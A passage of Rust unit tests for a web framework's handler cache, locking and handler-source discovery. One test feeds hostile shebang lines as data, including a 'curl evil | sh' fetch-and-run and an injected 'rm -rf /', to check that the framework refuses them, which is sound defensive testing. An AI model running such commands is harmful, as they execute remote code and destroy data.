        fs::write(&sentinel, b"original").expect("sentinel");
        for purpose in ["compiler", "stereotype compiler", "C# compiler"] {
            let link = root.path().join(format!("{purpose}-link"));
            symlink(&sentinel, &link).expect("link");
            assert!(
                reserve_attempt_directory(&link, purpose, purpose).is_err(),
                "symlink collision must fail"
            );
            assert!(
                fs::symlink_metadata(&link)
                    .expect("link remains")
                    .file_type()
                    .is_symlink()
            );
            assert_eq!(fs::read(&sentinel).expect("sentinel"), b"original");
        }
    }

    #[test]
    fn staged_cache_destination_collisions_fail_closed_and_remain_unchanged() {
        let root = tempfile::tempdir().expect("cache");
        let file = root.path().join("yon-handler.php");
        fs::write(&file, b"original").expect("file sentinel");
        stage_cached_bytes(&file, b"replacement", "stage cached bytes")
            .expect_err("mismatched existing file");
        assert_eq!(fs::read(&file).expect("file sentinel"), b"original");

        let directory = root.path().join("Yon.java");
        fs::create_dir(&directory).expect("directory sentinel");
        fs::write(directory.join("sentinel"), b"original").expect("nested sentinel");
        stage_cached_bytes(&directory, b"replacement", "stage cached bytes")
            .expect_err("directory collision");
        assert_eq!(
            fs::read(directory.join("sentinel")).expect("nested sentinel"),
            b"original"
        );
    }

    #[test]
    fn temporary_file_guard_never_removes_a_replacement() {
        let root = tempfile::tempdir().expect("cache");
        let reserved = root.path().join("attempt.tmp");
        fs::write(&reserved, b"owned").expect("owned file");
        let guard = TemporaryCachePath::file(&reserved);
        let moved = root.path().join("moved-owned.tmp");
        fs::rename(&reserved, &moved).expect("move owned file");
        fs::write(&reserved, b"replacement").expect("replacement file");

        drop(guard);

        assert_eq!(
            fs::read(&reserved).expect("replacement survives"),
            b"replacement"
        );
        assert_eq!(fs::read(&moved).expect("moved object survives"), b"owned");
    }

    #[test]
    fn temporary_directory_guard_never_removes_a_replacement() {
        let root = tempfile::tempdir().expect("cache");
        let reserved = root.path().join("attempt");
        fs::create_dir(&reserved).expect("owned directory");
        fs::write(reserved.join("owned"), b"owned").expect("owned sentinel");
        let guard = TemporaryCachePath::directory(&reserved);
        let moved = root.path().join("moved-owned");
        fs::rename(&reserved, &moved).expect("move owned directory");
        fs::create_dir(&reserved).expect("replacement directory");
        fs::write(reserved.join("replacement"), b"replacement").expect("replacement sentinel");

        drop(guard);

        assert_eq!(
            fs::read(reserved.join("replacement")).expect("replacement survives"),
            b"replacement"
        );
        assert_eq!(
            fs::read(moved.join("owned")).expect("moved object survives"),
            b"owned"
        );
    }

    #[test]
    fn old_lock_owner_cannot_delete_a_replacement_lock() {
        let root = tempfile::tempdir().expect("cache");
        let path = root.path().join("replace.lock");
        let old = acquire_cache_lock_with_wait(&path, "old", Duration::from_millis(20))
            .expect("old lock");
        fs::remove_file(&path).expect("simulate replacement race");
        fs::write(
            &path,
            format!("{} 0 replacement-token\n", std::process::id()),
        )
        .expect("replacement");
        drop(old);
        assert!(path.exists(), "old owner deleted replacement");
        assert!(
            fs::read_to_string(path)
                .expect("replacement")
                .contains("replacement-token")
        );
    }

    #[test]
    fn simultaneous_stale_recovery_yields_exactly_one_owner() {
        let root = tempfile::tempdir().expect("cache");
        let path = root.path().join("stale.lock");
        fs::write(&path, "4294967294 0 stale-token\n").expect("stale");
        let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
        let successes = std::thread::scope(|scope| {
            let attempts: Vec<_> = (0..2)
                .map(|_| {
                    let barrier = std::sync::Arc::clone(&barrier);
                    let path = path.clone();
                    scope.spawn(move || {
                        barrier.wait();
                        let acquired =
                            acquire_cache_lock_with_wait(&path, "race", Duration::from_millis(30));
                        if let Ok(lock) = acquired {
                            std::thread::sleep(Duration::from_millis(80));
                            drop(lock);
                            true
                        } else {
                            false
                        }
                    })
                })
                .collect();
            attempts
                .into_iter()
                .map(|attempt| attempt.join().expect("join"))
                .filter(|acquired| *acquired)
                .count()
        });
        assert_eq!(successes, 1);
    }

    #[test]
    fn failed_lock_metadata_initialization_removes_the_new_lock() {
        let root = tempfile::tempdir().expect("cache");
        let path = root.path().join("attempt.lock");
        let failure = acquire_cache_lock_with_initializer(
            &path,
            "attempt",
            Duration::from_millis(20),
            |_file, _pid, _created, _token| Err(std::io::Error::other("injected sync failure")),
        )
        .expect_err("initialization must fail");
        assert!(
            failure.to_string().contains("injected sync failure"),
            "{failure}"
        );
        assert!(!path.exists(), "failed initialization left a lock");
        let acquired = acquire_cache_lock_with_wait(&path, "attempt", Duration::from_millis(20))
            .expect("subsequent acquisition");
        assert!(path.exists());
        drop(acquired);
        assert!(!path.exists());
    }

    #[test]
    fn cache_pruning_surfaces_failed_removal_without_falsifying_bounds() {
        let root = tempfile::tempdir().expect("cache");
        fs::write(root.path().join("a"), vec![b'x'; 40]).expect("entry");
        fs::write(root.path().join("b"), vec![b'x'; 40]).expect("entry");
        let failure = prune_handler_cache_with_remover(root.path(), 1, 40, |_| {
            Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                "injected removal refusal",
            ))
        })
        .expect_err("failed removal must surface");
        assert_eq!(failure.kind(), std::io::ErrorKind::PermissionDenied);
        assert!(root.path().join("a").exists());
        assert!(root.path().join("b").exists());
    }

    #[test]
    fn cache_pruning_surfaces_traversal_and_size_accounting_failures() {
        let missing = tempfile::tempdir().expect("parent").path().join("missing");
        assert_eq!(
            prune_handler_cache_with_limits(&missing, 1, 1)
                .expect_err("missing traversal")
                .kind(),
            std::io::ErrorKind::NotFound
        );

        let root = tempfile::tempdir().expect("cache");
        fs::write(root.path().join("entry"), b"bytes").expect("entry");
        let measured = prune_handler_cache_with_operations(
            root.path(),
            0,
            0,
            |_| Ok(()),
            |_| Err(std::io::Error::other("injected metadata/read failure")),
        )
        .expect_err("measurement failure must surface");
        assert!(measured.to_string().contains("metadata/read"));
        assert!(root.path().join("entry").exists());
    }

    #[cfg(unix)]
    #[test]
    fn cache_pruning_rejects_unaccountable_entry_types() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("cache");
        symlink(root.path().join("missing"), root.path().join("dangling")).expect("symlink");
        let failure = prune_handler_cache_with_limits(root.path(), 0, 0)
            .expect_err("symlink size cannot be silently zero");
        assert_eq!(failure.kind(), std::io::ErrorKind::InvalidData);
        assert!(fs::symlink_metadata(root.path().join("dangling")).is_ok());
    }

    #[test]
    fn csharp_cache_requires_complete_matching_metadata_and_assembly() {
        let root = tempfile::tempdir().expect("cache");
        fs::create_dir_all(root.path().join("one/out")).expect("out");
        for name in super::CSHARP_RUNTIME_FILES {
            fs::write(root.path().join("one/out").join(name), b"artifact").expect("artifact");
        }
        let cache = CacheDirectory::open_test_root(root.path()).expect("cache capability");
        assert!(!valid_csharp_cache(&cache, "one", "digest=one\n"));
        fs::write(root.path().join("one/.complete"), "digest=wrong\n").expect("metadata");
        assert!(!valid_csharp_cache(&cache, "one", "digest=one\n"));
        fs::write(root.path().join("one/.complete"), "digest=one\n").expect("metadata");
        assert!(valid_csharp_cache(&cache, "one", "digest=one\n"));
    }

    #[test]
    fn compiled_cache_key_separates_toolchains_and_host_targets() {
        let key = |compiler, arch, os| compiled_digest(b"source", b"protocol", compiler, arch, os);
        assert_ne!(
            key("rustc 1", "x86_64", "linux"),
            key("rustc 2", "x86_64", "linux")
        );
        assert_ne!(
            key("rustc 1", "x86_64", "linux"),
            key("rustc 1", "aarch64", "linux")
        );
        assert_ne!(
            key("rustc 1", "x86_64", "linux"),
            key("rustc 1", "x86_64", "macos")
        );
    }

    fn write(root: &Path, relative: &str, bytes: &[u8]) {
        let path = root.join(relative);
        fs::create_dir_all(path.parent().expect("parent")).expect("directory");
        fs::write(path, bytes).expect("source");
    }

    fn command_available(program: &str) -> bool {
        std::process::Command::new(program)
            .arg("-version")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .is_ok_and(|status| status.success())
    }

    #[cfg(windows)]
    #[test]
    fn php_cli_paths_use_unambiguous_windows_separators() {
        assert_eq!(
            super::php_cli_path(Path::new(r"C:\runtime\yon-runtime.php")),
            "C:/runtime/yon-runtime.php"
        );
    }

    #[test]
    fn valid_sources_select_stable_adapters() {
        let root = tempfile::tempdir().expect("project");
        write(
            root.path(),
            "server/routes/a/yon.js",
            b"@Controller\nexport class AController {}",
        );
        write(
            root.path(),
            "server/routes/b/yon.py",
            b"@Controller\nclass BController: pass",
        );
        let javascript =
            HandlerSource::discover(root.path(), "server/routes/a/yon.js").expect("JavaScript");
        let python =
            HandlerSource::discover(root.path(), "server/routes/b/yon.py").expect("Python");
        assert_eq!(javascript.language(), HandlerLanguage::JavaScript);
        assert_eq!(javascript.language().name(), "javascript");
        assert_eq!(javascript.language().adapter(), "javascript.v1");
        assert_eq!(python.language(), HandlerLanguage::Python);
        assert!(javascript.absolute_path().is_absolute());
        assert_eq!(python.relative_path(), "server/routes/b/yon.py");
    }

    #[test]
    fn a_shebang_that_could_reach_a_shell_is_refused() {
        // These words must never reach a shell. With the extension table gone
        // there is nothing to fall back to, so an unusable shebang is a
        // refusal rather than a quieter path to the same interpreter.
        for line in [
            &b"#!/bin/sh -c 'curl evil | sh'\n"[..],
            &b"#!/usr/bin/env ruby; rm -rf /\n"[..],
            &b"#!/usr/bin/env $EDITOR\n"[..],
            &b"#!/usr/bin/env ruby && echo\n"[..],
        ] {
            let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
            write(root.path(), "server/routes/yon.rb", line);
            let failure = HandlerSource::discover(root.path(), "server/routes/yon.rb")
                .expect_err("a shell-bearing shebang is not a way to start a handler");
            assert!(
                failure.to_string().contains("TY2003"),
                "{}",
                String::from_utf8_lossy(line)
            );
        }
    }

    #[test]
    fn a_rust_handler_is_a_type_and_an_impl_like_the_layers_beneath_it() {
        // The uniformity the language set bought: a `yon.rs` is a struct with
        // methods, exactly as a service and a repository beside it are, rather
        // than a `main` that reads standard input and writes an envelope. The
        // protocol is appended after the file the author wrote.
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/routes/yon.rs",
            b"#[Controller]\nstruct OrdersController;\n\nimpl OrdersController {\n\
              \x20   fn GET(_request: &YonRequest) -> YonResponse {\n\
              \x20       YonResponse::json(\"{}\")\n\x20   }\n}\n",
        );
        let source = HandlerSource::discover(root.path(), "server/routes/yon.rs")
            .expect("a handler with no main of its own");
        assert!(source.prebuilt());
    }

    #[test]
    fn a_rust_handler_carries_a_stereotype_without_a_cargo_manifest() {
        // The reason Rust was once excluded was wrong. A custom attribute is a
        // procedural macro, and a procedural macro needs a *crate*, not a
        // manifest: `rustc --crate-type=proc-macro` builds one from a single
        // file, and `--extern` puts it in reach. Both are invocations of a
        // compiler Tachyon already drives.
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/routes/yon.rs",
            b"#[Controller]\nstruct OrdersController;\n\nimpl OrdersController {\n    fn GET(_request: &YonRequest) -> YonResponse { YonResponse::json(\"{}\") }\n}\n",
        );
        let source =
            HandlerSource::discover(root.path(), "server/routes/yon.rs").expect("rust handler");
        assert!(source.prebuilt(), "a compiled handler names its artefact");
        // The crate is cached beside the handlers and named the way the
        // platform names a library, or rustc will not accept it as an extern.
        let staged = root.path().join(".tachyon/handlers");
        let built: Vec<_> = std::fs::read_dir(&staged)
            .expect("cache")
            .filter_map(Result::ok)
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .collect();
        assert!(
            built.iter().any(|name| name.starts_with(&format!(
                "{}tachyon_stereotypes",
                std::env::consts::DLL_PREFIX
            ))),
            "{built:?}"
        );
    }

    #[test]
    fn a_shebang_is_refused_because_yon_knows_how_to_start_its_languages() {
        // A shebang was the right answer while Yon ran any language: Tachyon
        // could not hold a table of every interpreter in the world. A bounded
        // set is a table, and one Tachyon owns rather than every handler
        // repeating — so the line is now noise that can disagree with the
        // truth.
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/routes/yon.php",
            b"#!/usr/bin/env php\n<?php\n",
        );
        let failure = HandlerSource::discover(root.path(), "server/routes/yon.php")
            .expect_err("a handler that says how to run itself");
        let rendered = failure.to_string();
        assert!(rendered.contains("TY2003"), "{rendered}");
        assert!(rendered.contains("Delete the first line"), "{rendered}");
    }

    #[test]
    fn yon_runs_only_the_languages_that_can_declare_a_layer() {
        // The revamp: a handler declares its layer, so a language whose syntax
        // cannot carry an annotation cannot be a handler. A shebang chooses how a supported
        // language starts; it no longer admits an unsupported one, and neither
        // does an executable bit — that arm is gone with the languages it was
        // there to run.
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        for (name, body) in [
            ("server/routes/yon.rb", &b"#!/usr/bin/env ruby\n"[..]),
            ("server/routes/yon.go", &b"package main\n"[..]),
            ("server/routes/yon.sh", &b"#!/bin/sh\necho\n"[..]),
            ("server/routes/yon.pl", &b"#!/usr/bin/env perl\n"[..]),
        ] {
            write(root.path(), name, body);
            let failure = HandlerSource::discover(root.path(), name)
                .expect_err(&format!("{name} is not a Yon language"));
            let rendered = failure.to_string();
            assert!(rendered.contains("TY2003"), "{rendered}");
            // The help names the set the resolver actually gates on, which is
            // the property that stopped `yon.ts` being advertised and refused.
            for supported in crate::stereotype::ANNOTATED_LANGUAGES {
                assert!(rendered.contains(&format!("yon.{supported}")), "{rendered}");
            }
        }
    }

    #[test]
    fn a_csharp_artefact_is_keyed_on_the_framework_it_was_built_against() {
        // A .NET upgrade has to invalidate the cache. An assembly pins
        // `<TargetFramework>` to the newest major installed when it was built,
        // so a key that ignores the framework makes every artefact built
        // before the upgrade a hit that cannot start — reported as "You must
        // install or update .NET to run this application", which describes the
        // machine rather than the artefact.
        //
        // Checked on the key rather than by installing two runtimes: the
        // property is that the framework reaches the digest at all.
        const HANDLER: &[u8] = b"[Controller]\nclass OrdersController {}";
        assert_ne!(
            csharp_digest(HANDLER, "net9.0"),
            csharp_digest(HANDLER, "net10.0"),
            "a framework change has to produce a new artefact"
        );
        assert_eq!(
            csharp_digest(HANDLER, "net10.0"),
            csharp_digest(HANDLER, "net10.0"),
            "an unchanged handler on an unchanged framework is still reused"
        );
        assert_ne!(
            csharp_digest(HANDLER, "net10.0"),
            csharp_digest(b"[Controller]\nclass ItemsController {}", "net10.0"),
            "a changed handler still produces a new artefact"
        );
    }

    #[test]
    fn an_ahead_of_time_language_is_compiled_once_and_reused() {
        if !command_available("kotlinc") {
            return;
        }
        // A compiled handler is keyed on its source digest, so the build cost
        // is paid on first use and every later request reuses the artefact.
        let root = tempfile::tempdir().unwrap_or_else(|_| unreachable!());
        write(
            root.path(),
            "server/routes/yon.kt",
            b"@Controller\nobject OrdersController {\n\
              \x20   @JvmStatic fun GET(request: YonRequest): YonResponse =\n\
              \x20       YonResponse.json(\"{}\")\n}\n",
        );
        let first = HandlerSource::discover(root.path(), "server/routes/yon.kt").expect("kotlin");
        assert!(first.prebuilt(), "a compiled handler names its artefact");
        let first_runtime = std::path::PathBuf::from(first.interpreter().last().expect("artefact"));
        assert!(first_runtime.is_file(), "{first_runtime:?}");
        let cache_root = root.path().join(".tachyon/handlers");
        let artefact = fs::read_dir(&cache_root)
            .expect("cache")
            .flatten()
            .map(|entry| entry.path())
            .find(|path| path.extension().is_some_and(|extension| extension == "jar"))
            .expect("cached jar");
        let stamp = std::fs::metadata(&artefact)
            .expect("metadata")
            .modified()
            .expect("mtime");

        let second = HandlerSource::discover(root.path(), "server/routes/yon.kt").expect("kotlin");
        let second_runtime =
            std::path::PathBuf::from(second.interpreter().last().expect("artefact"));
        assert_ne!(second_runtime, first_runtime);
        assert_eq!(
            fs::read(&second_runtime).expect("second copy"),
            fs::read(&first_runtime).expect("first copy")
        );
        assert_eq!(
            std::fs::metadata(&artefact)
                .expect("metadata")
                .modified()
                .expect("mtime"),
            stamp,
            "an unchanged handler must not be rebuilt"
        );

        // A zero-length cache entry is never executable and must be rebuilt.
        fs::write(&artefact, []).expect("partial artifact");
        let repaired = HandlerSource::discover(root.path(), "server/routes/yon.kt")
            .expect("partial cache is rebuilt");
        assert!(std::path::Path::new(repaired.interpreter().last().expect("repaired")).is_file());
        assert!(fs::metadata(&artefact).expect("repaired").len() > 0);

        // Publishing the same missing key concurrently yields one complete
        // final artifact and no observable temporary artifacts.
        fs::remove_file(&artefact).expect("remove artifact");
        std::thread::scope(|scope| {
            let left = scope.spawn(|| {
                HandlerSource::discover(root.path(), "server/routes/yon.kt").expect("left build")
            });
            let right = scope.spawn(|| {
                HandlerSource::discover(root.path(), "server/routes/yon.kt").expect("right build")
            });
            let left = left.join().expect("left join");
            let right = right.join().expect("right join");
            let left = std::path::Path::new(left.interpreter().last().expect("left artifact"));
            let right = std::path::Path::new(right.interpreter().last().expect("right artifact"));
            assert_ne!(left, right);
            assert_eq!(
                fs::read(left).expect("left copy"),
                fs::read(right).expect("right copy")
            );
        });
        assert!(fs::metadata(&artefact).expect("published").len() > 0);
        let temporary: Vec<_> = fs::read_dir(&cache_root)
            .expect("cache entries")
            .flatten()
            .filter(|entry| entry.file_name().to_string_lossy().contains("tmp"))
            .collect();
        assert!(temporary.is_empty(), "{temporary:?}");
        let (entries, bytes) = path_usage(&cache_root).expect("usage");
        assert!(entries <= 257, "recursive cache entries: {entries}");
        assert!(bytes <= 512 * 1024 * 1024, "cache bytes: {bytes}");
    }

    #[test]
    fn concurrent_csharp_publication_leaves_cache_within_recursive_bounds() {
        if !std::process::Command::new("dotnet")
            .arg("--version")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .is_ok_and(|status| status.success())
        {
            return;
        }
        let root = tempfile::tempdir().expect("project");
        write(
            root.path(),
            "server/routes/yon.cs",
            b"[Controller]\nsealed class OrdersController { public static YonResponse GET(YonRequest request) => YonResponse.Json(\"{}\"); }\n",
        );
        std::thread::scope(|scope| {
            let left = scope.spawn(|| {
                HandlerSource::discover(root.path(), "server/routes/yon.cs").expect("left C#")
            });
            let right = scope.spawn(|| {
                HandlerSource::discover(root.path(), "server/routes/yon.cs").expect("right C#")
            });
            let left = left.join().expect("left join");
            let right = right.join().expect("right join");
            let left = std::path::Path::new(left.interpreter().last().expect("left assembly"));
            let right = std::path::Path::new(right.interpreter().last().expect("right assembly"));
            assert_ne!(left, right);
            assert_eq!(
                fs::read(left).expect("left assembly"),
                fs::read(right).expect("right assembly")
            );
        });
        let cache = root.path().join(".tachyon/handlers");
        let (entries, bytes) = path_usage(&cache).expect("usage");
        assert!(entries <= 257, "recursive cache entries: {entries}");
        assert!(bytes <= 512 * 1024 * 1024, "cache bytes: {bytes}");
        assert!(
            fs::read_dir(cache)
                .expect("cache")
                .flatten()
                .all(|entry| !entry.file_name().to_string_lossy().contains("tmp"))
        );
    }

    #[test]
    fn failed_compilation_leaves_no_attempt_source_or_artifact() {
        let root = tempfile::tempdir().expect("project");
        write(
            root.path(),
            "server/routes/yon.kt",
            b"@Controller\nobject BrokenController { @JvmStatic fun GET( }",
        );
        HandlerSource::discover(root.path(), "server/routes/yon.kt")
            .expect_err("invalid Kotlin must fail compilation");
        let cache = root.path().join(".tachyon/handlers");
        let residue: Vec<_> = fs::read_dir(cache)
            .expect("cache")
            .flatten()
            .filter(|entry| entry.file_name().to_string_lossy().contains("tmp"))
            .collect();
        assert!(residue.is_empty(), "{residue:?}");
    }

    #[test]
    fn unsafe_unsupported_and_malformed_sources_fail_closed() {
        let root = tempfile::tempdir().expect("project");
        write(root.path(), "server/routes/yon.rb", b"handler");
        write(
            root.path(),
            "server/routes/contains-nul/yon.py",
            b"class\0 Handler",
        );
        write(root.path(), "server/routes/bytes/yon.js", &[0xff, 0xfe]);
        write(
            root.path(),
            "server/routes/large/yon.py",
            &vec![b'x'; 1024 * 1024 + 1],
        );
        for (path, code) in [
            ("../yon.py", "TY2002"),
            ("client/pages/yon.py", "TY2002"),
            // PHP is a Yon language now, so the refusal here is a language
            // that cannot declare a layer rather than one nothing can start.
            ("server/routes/yon.rb", "TY2003"),
            ("server/routes/missing/yon.py", "TY2001"),
            ("server/routes/contains-nul/yon.py", "TY2004"),
            ("server/routes/bytes/yon.js", "TY2004"),
            ("server/routes/large/yon.py", "TY2004"),
        ] {
            let failure = HandlerSource::discover(root.path(), path).expect_err(path);
            assert!(failure.to_string().contains(code), "{path}: {failure}");
        }
    }

    #[test]
    fn relay_materialization_ignores_comment_and_string_decoys() {
        for (extension, source, rewritten) in [
            (
                "java",
                "// @Delegate class Fake { @Relay(\"bad\") }\nclass Text { String x = \"@Delegate @Relay(\\\"bad\\\")\"; }\n@Delegate class RealDelegate { @Relay(\"tool\") static YonResponse POST(YonRequest request) { throw new RuntimeException(\"placeholder\"); } }",
                "Yon.relay",
            ),
            (
                "kt",
                "// @Delegate object Fake { @Relay(\"bad\") }\nval text = \"@Delegate @Relay(bad)\"\n@Delegate object RealDelegate {\n@Relay(\"tool\")\n@JvmStatic\nfun POST(request: YonRequest): YonResponse { error(\"placeholder\") } }",
                "Yon.relay",
            ),
            (
                "cs",
                "// [Delegate] class Fake { [Relay(\"bad\")] }\nclass Text { string x = \"[Delegate] [Relay(bad)]\"; }\n[Delegate] class RealDelegate { [Relay(\"tool\")] static YonResponse POST(YonRequest request) { throw new Exception(\"placeholder\"); } }",
                "Yon.Relay",
            ),
            (
                "php",
                "<?php // #[Delegate] class Fake { #[Relay(\"bad\")] }\n$text = \"#[Delegate] #[Relay(bad)]\";\n#[Delegate] class RealDelegate { #[Relay(\"tool\")] public static function POST($request) { throw new Exception(\"placeholder\"); } }",
                "Yon::relay",
            ),
        ] {
            let materialized = materialize_compiled_relays(extension, source, "server/routes/yon")
                .expect(extension);
            assert!(
                materialized.contains(rewritten),
                "{extension}: {materialized}"
            );
            assert!(
                !materialized.contains("throw new"),
                "{extension}: {materialized}"
            );
            assert!(
                !materialized.contains("error(\"placeholder\")"),
                "{extension}"
            );
        }
    }

    #[test]
    fn malformed_real_relay_annotations_fail_before_placeholder_execution() {
        for (extension, source) in [
            (
                "java",
                "@Delegate class D { @Relay(\"tool\" static Object POST(Object request) { throw new Error(); } }",
            ),
            (
                "kt",
                "@Delegate object D { @Relay(\"tool\" fun POST(request: Any): Any { error(\"ran\") } }",
            ),
            (
                "cs",
                "[Delegate] class D { [Relay(\"tool\"] static object POST(object request) { throw new Exception(); } }",
            ),
            (
                "php",
                "#[Delegate] class D { #[Relay(\"tool\"] public static function POST($request) { throw new Exception(); } }",
            ),
        ] {
            let failure = materialize_compiled_relays(extension, source, "server/routes/yon")
                .expect_err(extension);
            assert!(
                failure.to_string().contains("Malformed @Relay"),
                "{extension}: {failure}"
            );
        }
    }

    #[test]
    fn multiline_and_verbatim_string_decoys_cannot_redirect_relay_rewrites() {
        for (extension, source, rewritten) in [
            (
                "java",
                "class Text { String value = \"\"\"\n@Delegate @Relay(\"bad\")\n\"\"\"; }\n@Delegate class D { @Relay(\"tool\") static Object POST(Object request) { throw new Error(); } }",
                "Yon.relay",
            ),
            (
                "kt",
                "val value = \"\"\"\n@Delegate @Relay(\"bad\")\n\"\"\"\n@Delegate object D {\n@Relay(\"tool\")\nfun POST(request: Any): Any { error(\"placeholder\") } }",
                "Yon.relay",
            ),
            (
                "cs",
                "class Text { string value = @\"[Delegate] \"\"quoted\"\" [Relay(\"\"bad\"\")]\"; }\n[Delegate] class D { [Relay(\"tool\")] static object POST(object request) { throw new Exception(); } }",
                "Yon.Relay",
            ),
            (
                "php",
                "<?php\n$value = <<<'DECOY'\n#[Delegate] #[Relay(\"bad\")]\nDECOY;\n#[Delegate] class D { #[Relay(\"tool\")] public static function POST($request) { throw new Exception(); } }",
                "Yon::relay",
            ),
        ] {
            let materialized = materialize_compiled_relays(extension, source, "server/routes/yon")
                .expect(extension);
            assert!(
                materialized.contains(rewritten),
                "{extension}: {materialized}"
            );
        }
    }

    #[test]
    fn relay_annotations_without_a_method_signature_or_body_fail_closed() {
        for (extension, source, expected) in [
            (
                "java",
                "@Delegate class D { @Relay(\"tool\") int value; }",
                "signature",
            ),
            (
                "java",
                "@Delegate class D { @Relay(\"tool\") static Object POST(Object request); }",
                "body",
            ),
            (
                "kt",
                "@Delegate object D { @Relay(\"tool\") val value = 1 }",
                "signature",
            ),
            (
                "kt",
                "@Delegate object D { @Relay(\"tool\") fun POST(request: Any): Any = request }",
                "body",
            ),
            (
                "cs",
                "[Delegate] class D { [Relay(\"tool\")] int value; }",
                "signature",
            ),
            (
                "cs",
                "[Delegate] abstract class D { [Relay(\"tool\")] abstract object POST(object request); }",
                "body",
            ),
            (
                "php",
                "#[Delegate] class D { #[Relay(\"tool\")] public $value; }",
                "signature",
            ),
            (
                "php",
                "#[Delegate] abstract class D { #[Relay(\"tool\")] abstract public static function POST($request); }",
                "body",
            ),
        ] {
            let failure = materialize_compiled_relays(extension, source, "server/routes/yon")
                .expect_err(extension);
            let rendered = failure.to_string();
            assert!(
                rendered.contains("Malformed @Relay"),
                "{extension}: {rendered}"
            );
            assert!(rendered.contains(expected), "{extension}: {rendered}");
        }
    }

    #[test]
    fn relay_placement_is_scoped_to_the_actual_delegate_class_in_every_language() {
        let cases = [
            (
                "js",
                "@Delegate\nclass D { @Relay('tool') POST(request) {} }",
                "@Controller\nclass C { @Relay('tool') POST(request) {} }",
                "@Delegate\nclass D {}\nclass Helper { @Relay('tool') POST(request) {} }",
                "const decoy = `@Controller class C { @Relay('bad') POST(r) {} }`;\n@Delegate\nclass D { @Relay('tool') POST(request) {} }",
            ),
            (
                "ts",
                "@Delegate\nclass D { @Relay('tool') POST(request: unknown) {} }",
                "@Service\nclass S { @Relay('tool') POST(request: unknown) {} }",
                "@Delegate\nclass D {}\nclass Helper { @Relay('tool') POST(request: unknown) {} }",
                "const decoy = `@Delegate class X { @Relay('bad') POST(r) {} }`;\n@Delegate\nclass D { @Relay('tool') POST(request: unknown) {} }",
            ),
            (
                "py",
                "@Delegate\nclass D:\n    @Relay('tool')\n    def POST(request):\n        pass\n",
                "@Controller\nclass C:\n    @Relay('tool')\n    def POST(request):\n        pass\n",
                "@Delegate\nclass D:\n    pass\nclass Helper:\n    @Relay('tool')\n    def POST(request):\n        pass\n",
                "decoy = '''@Delegate\nclass X:\n    @Relay('bad')\n    def POST(r): pass'''\n@Delegate\nclass D:\n    @Relay('tool')\n    def POST(request):\n        pass\n",
            ),
            (
                "java",
                "@Delegate class D { @Relay(\"tool\") Object POST(Object request) {} }",
                "@Service class S { @Relay(\"tool\") Object POST(Object request) {} }",
                "@Delegate class D {} class Helper { @Relay(\"tool\") Object POST(Object request) {} }",
                "String decoy = \"@Delegate @Relay(bad)\"; @Delegate class D { @Relay(\"tool\") Object POST(Object request) {} }",
            ),
            (
                "kt",
                "@Delegate object D { @Relay(\"tool\") fun POST(request: Any) {} }",
                "@Controller object C { @Relay(\"tool\") fun POST(request: Any) {} }",
                "@Delegate object D {} object Helper { @Relay(\"tool\") fun POST(request: Any) {} }",
                "val decoy = \"\"\"@Delegate @Relay(bad)\"\"\"\n@Delegate object D { @Relay(\"tool\") fun POST(request: Any) {} }",
            ),
            (
                "cs",
                "[Delegate] class D { [Relay(\"tool\")] object POST(object request) {} }",
                "[Client] class C { [Relay(\"tool\")] object POST(object request) {} }",
                "[Delegate] class D {} class Helper { [Relay(\"tool\")] object POST(object request) {} }",
                "string decoy = @\"[Delegate] [Relay(\"\"bad\"\")]\"; [Delegate] class D { [Relay(\"tool\")] object POST(object request) {} }",
            ),
            (
                "php",
                "#[Delegate] class D { #[Relay(\"tool\")] public function POST($request) {} }",
                "#[Repository] class R { #[Relay(\"tool\")] public function POST($request) {} }",
                "#[Delegate] class D {} class Helper { #[Relay(\"tool\")] public function POST($request) {} }",
                "<?php $decoy = <<<'X'\n#[Delegate] #[Relay(\"bad\")]\nX;\n#[Delegate] class D { #[Relay(\"tool\")] public function POST($request) {} }",
            ),
            (
                "rs",
                "#[Delegate] struct D; impl D { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
                "#[Controller] struct C; impl C { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
                "#[Delegate] struct D; impl D {} struct Helper; impl Helper { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
                "let decoy = r#\"#[Delegate] #[Relay(\\\"bad\\\")]\"#; #[Delegate] struct D; impl D { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
            ),
        ];
        for (extension, valid, misplaced, helper, decoy) in cases {
            let path = Path::new("server/routes/yon").with_extension(extension);
            for accepted in [valid, decoy] {
                validate_relay_placement(&path, accepted, "server/routes/yon")
                    .unwrap_or_else(|failure| panic!("{extension}: {failure}"));
            }
            for rejected in [misplaced, helper] {
                let failure = validate_relay_placement(&path, rejected, "server/routes/yon")
                    .expect_err(extension);
                assert!(
                    failure.to_string().contains("@Delegate"),
                    "{extension}: {failure}"
                );
            }
        }
    }

    #[test]
    fn relay_method_attachment_ignores_tokens_inside_fields_comments_and_strings() {
        for (extension, source) in [
            (
                "js",
                "@Delegate class D { @Relay('tool') field = 'fake(call)' }",
            ),
            (
                "ts",
                "@Delegate class D { @Relay('tool') field: string = 'fake(call)' }",
            ),
            (
                "py",
                "@Delegate\nclass D:\n    @Relay('tool')\n    field = 'def POST(request): pass'\n",
            ),
            (
                "java",
                "@Delegate class D { @Relay(\"tool\") String field = \"POST(request)\"; }",
            ),
            (
                "kt",
                "@Delegate object D { @Relay(\"tool\") val field = \"fun POST(request: Any)\" }",
            ),
            (
                "cs",
                "[Delegate] class D { [Relay(\"tool\")] string field = \"POST(request)\"; }",
            ),
            (
                "php",
                "#[Delegate] class D { #[Relay(\"tool\")] public $field = \"function POST($request)\"; }",
            ),
            (
                "rs",
                "#[Delegate] struct D; impl D { #[Relay(\"tool\")] const FIELD: &str = \"fn POST(request: &YonRequest)\"; }",
            ),
        ] {
